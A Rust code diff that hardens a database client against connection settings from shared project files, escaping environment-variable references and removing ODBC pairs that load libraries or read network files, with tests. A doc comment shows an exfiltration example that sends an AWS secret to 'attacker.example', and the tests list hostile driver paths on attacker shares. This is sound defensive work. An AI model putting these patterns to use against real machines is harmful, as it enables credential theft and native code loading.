@@ -444,6 +444,140 @@ pub fn guard(before: &SavedConnection, after: &mut SavedConnection) -> Guarded {
     }
 }
 
+/// `text` with each `${` that would read an environment variable written `$${`, which a
+/// connection reads as the text itself; one written so already stays as it is.
+#[must_use]
+pub fn held_references(text: &str) -> String {
+    let mut out = String::with_capacity(text.len() + 1);
+    let mut rest = text;
+    while let Some(at) = rest.find("${") {
+        out.push_str(&rest[..at]);
+        if !rest[..at].ends_with('$') {
+            out.push('$');
+        }
+        out.push_str("${");
+        rest = &rest[at + 2..];
+    }
+    out.push_str(rest);
+    out
+}
+
+/// Holds the references of `field`, set from a shared file, unless it says what `before`
+/// (this machine's text) says up to held references: then this machine's text stays.
+/// Whether a reference was held.
+fn hold(field: &mut String, before: Option<&str>) -> bool {
+    if !field.contains("${") {
+        return false;
+    }
+    let held = held_references(field);
+    if let Some(before) = before
+        && held_references(before) == held
+    {
+        before.clone_into(field);
+        return false;
+    }
+    let changed = held != *field;
+    *field = held;
+    changed
+}
+
+/// Holds the `${env:NAME}` references of the fields that a shared project file sets or
+/// changes on a connection, against `before` (this machine's, `None` for a new one): they read
+/// this computer's environment, and a file anyone with write access to the folder can edit
+/// could send a variable to a server of its choosing (`host = "attacker.example"`,
+/// `user = "${env:AWS_SECRET_ACCESS_KEY}"`). Held as `$${…}`, the field connects as written
+/// until the user edits it in the connection's form; fields equal to this machine's keep
+/// their references. Whether any was held.
+pub fn hold_shared_references(
+    before: Option<&SavedConnection>,
+    after: &mut SavedConnection,
+) -> bool {
+    let mut held = false;
+    held |= hold(&mut after.host, before.map(|b| b.host.as_str()));
+    held |= hold(&mut after.database, before.map(|b| b.database.as_str()));
+    held |= hold(&mut after.user, before.map(|b| b.user.as_str()));
+    if let Some(schema) = &mut after.init.schema {
+        let old = before.and_then(|b| b.init.schema.as_deref());
+        held |= hold(schema, old);
+    }
+    for (name, value) in &mut after.options {
+        let old = before.and_then(|b| b.options.get(name)).map(String::as_str);
+        held |= hold(value, old);
+    }
+    let old_hops: Vec<&SavedSsh> = before
+        .and_then(|b| b.ssh.as_ref())
+        .map(|s| s.chain().collect())
+        .unwrap_or_default();
+    let mut hop = after.ssh.as_mut();
+    let mut depth = 0;
+    while let Some(ssh) = hop {
+        let old = old_hops.get(depth);
+        held |= hold(&mut ssh.host, old.map(|o| o.host.as_str()));
+        held |= hold(&mut ssh.user, old.map(|o| o.user.as_str()));
+        hop = ssh.jump.as_deref_mut();
+        depth += 1;
+    }
+    held
+}
+
+/// Whether the ODBC driver `value` is a library's path rather than an installed driver's
+/// name: a shared file could make the driver manager load native code from anywhere.
+fn is_library_path(value: &str) -> bool {
+    let value = value.trim().trim_start_matches('{').trim_end_matches('}');
+    let lower = value.to_lowercase();
+    value.contains(['/', '\\'])
+        || value.as_bytes().get(1) == Some(&b':')
+        || [".so", ".dll", ".dylib"].iter().any(|e| lower.ends_with(e))
+        || lower.contains(".so.")
+}
+
+/// An ODBC connection string without the pairs a shared file must not set: `FILEDSN` and
+/// `SAVEFILE` (a file read or written, on a share they leak the Windows login), a `DRIVER`
+/// given as a library's path, and any value that is a network path (`\\host\share`).
+fn without_native_pairs(text: &str) -> String {
+    text.split(';')
+        .filter(|pair| {
+            let (name, value) = pair.split_once('=').unwrap_or((pair, ""));
+            let name = name.trim().to_lowercase();
+            let value = value.trim().trim_start_matches('{');
+            let network = value.starts_with("\\\\") || value.starts_with("//");
+            let library = name == "driver" && is_library_path(value);
+            !(name == "filedsn" || name == "savefile" || library || network)
+        })
+        .collect::<Vec<_>>()
+        .join(";")
+}
+
+/// Keeps a shared project file from making the ODBC driver manager load a library or open a
+/// file of its choosing: a `driver` option given as a path is replaced by this machine's
+/// (or left out), and the connection strings lose `FILEDSN`, `SAVEFILE`, a `DRIVER` path and
+/// network paths. Values equal to this machine's stay: they are the user's own. Whether any
+/// was changed.
+pub fn without_native_loads(before: Option<&SavedConnection>, after: &mut SavedConnection) -> bool {
+    let old = |name: &str| before.and_then(|b| b.options.get(name)).cloned();
+    let mut changed = false;
+    if let Some(driver) = after.options.get("driver").cloned()
+        && old("driver").as_ref() != Some(&driver)
+        && is_library_path(&driver)
+    {
+        match old("driver") {
+            Some(mine) => after.options.insert("driver".to_owned(), mine),
+            None => after.options.remove("driver"),
+        };
+        changed = true;
+    }
+    for name in ["connection_string", "dsn_string"] {
+        if let Some(text) = after.options.get_mut(name)
+            && old(name).as_ref() != Some(text)
+        {
+            let clean = without_native_pairs(text);
+            changed |= clean != *text;
+            *text = clean;
+        }
+    }
+    changed
+}
+
 /// A network profile without keys.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct ShareProfile {
@@ -656,6 +790,123 @@ mod tests {
         mine.user = "zed".to_owned();
         let shared = ShareConnection::from_saved(&mine, true);
         assert_eq!(shared.into_saved(Some(&leaky())).user, "zed");
+    }
+
+    #[test]
+    fn references_are_held_once_and_read_as_written() {
+        for (text, held) in [
+            ("db.example.com", "db.example.com"),
+            ("${env:HOST}", "$${env:HOST}"),
+            ("$${env:HOST}", "$${env:HOST}"),
+            ("a${env:A}-${env:B}", "a$${env:A}-$${env:B}"),
+            ("${", "$${"),
+        ] {
+            assert_eq!(held_references(text), held, "{text}");
+            assert_eq!(held_references(held), held, "{held} twice");
+        }
+        let vars = platypus_core::EnvVars::with(
+            BTreeMap::from([("A".to_owned(), "CANARY".to_owned())]),
+            BTreeMap::new(),
+        );
+        assert_eq!(
+            platypus_core::expand_env(&held_references("x${env:A}"), &vars).unwrap(),
+            "x${env:A}"
+        );
+
+        // New fields are held, the SSH hops and options included; this machine's stay.
+        let mut before = SavedConnection::new("c", DriverKind::Postgres);
+        before
+            .options
+            .insert("warehouse".to_owned(), "${env:WH}".to_owned());
+        let mut after = before.clone();
+        after.host = "${env:H}".to_owned();
+        after.init.schema = Some("${env:S}".to_owned());
+        after
+            .options
+            .insert("role".to_owned(), "${env:R}".to_owned());
+        after.ssh = Some(SavedSsh {
+            host: "bastion".to_owned(),
+            port: 22,
+            user: "${env:U}".to_owned(),
+            auth: SshAuthKind::Agent,
+            key_path: None,
+            secret_id: Uuid::nil(),
+            jump: Some(Box::new(SavedSsh {
+                host: "${env:J}".to_owned(),
+                port: 22,
+                user: String::new(),
+                auth: SshAuthKind::Agent,
+                key_path: None,
+                secret_id: Uuid::nil(),
+                jump: None,
+            })),
+        });
+        assert!(hold_shared_references(Some(&before), &mut after));
+        assert_eq!(after.host, "$${env:H}");
+        assert_eq!(after.init.schema.as_deref(), Some("$${env:S}"));
+        assert_eq!(after.options["role"], "$${env:R}");
+        assert_eq!(after.options["warehouse"], "${env:WH}");
+        let ssh = after.ssh.as_ref().unwrap();
+        assert_eq!(ssh.user, "$${env:U}");
+        assert_eq!(ssh.jump.as_ref().unwrap().host, "$${env:J}");
+        assert!(!hold_shared_references(Some(&before), &mut before.clone()));
+    }
+
+    #[test]
+    fn odbc_settings_from_a_shared_file_load_no_library() {
+        for driver in [
+            "/opt/evil/libevil.so",
+            "C:\\evil\\evil.dll",
+            "\\\\attacker\\share\\x.dll",
+            "{libevil.so.1}",
+            "evil.dylib",
+        ] {
+            assert!(is_library_path(driver), "{driver}");
+        }
+        for driver in [
+            "ODBC Driver 18 for SQL Server",
+            "{PostgreSQL Unicode}",
+            "SQLite3",
+        ] {
+            assert!(!is_library_path(driver), "{driver}");
+        }
+        assert_eq!(
+            without_native_pairs(
+                "Driver={ODBC Driver 18 for SQL Server};Server=h;FileDSN=x.dsn;SaveFile=y;KeyFile={\\\\host\\k}"
+            ),
+            "Driver={ODBC Driver 18 for SQL Server};Server=h"
+        );
+
+        let mut before = SavedConnection::new("c", DriverKind::Odbc);
+        before
+            .options
+            .insert("driver".to_owned(), "/usr/lib/my/libodbc.so".to_owned());
+        before.options.insert(
+            "connection_string".to_owned(),
+            "FILEDSN=mine.dsn".to_owned(),
+        );
+        // This machine's own values are the user's: they stay.
+        let mut same = before.clone();
+        assert!(!without_native_loads(Some(&before), &mut same));
+        assert_eq!(same, before);
+        // A path from the file gives way to this machine's driver, or to none.
+        let mut after = before.clone();
+        after
+            .options
+            .insert("driver".to_owned(), "/tmp/evil.so".to_owned());
+        after.options.insert(
+            "connection_string".to_owned(),
+            "FILEDSN=\\\\evil\\x;Server=h".to_owned(),
+        );
+        assert!(without_native_loads(Some(&before), &mut after));
+        assert_eq!(after.options["driver"], "/usr/lib/my/libodbc.so");
+        assert_eq!(after.options["connection_string"], "Server=h");
+        let mut fresh = after.clone();
+        fresh
+            .options
+            .insert("driver".to_owned(), "/tmp/evil.so".to_owned());
+        assert!(without_native_loads(None, &mut fresh));
+        assert!(!fresh.options.contains_key("driver"));
     }
 
     #[test]
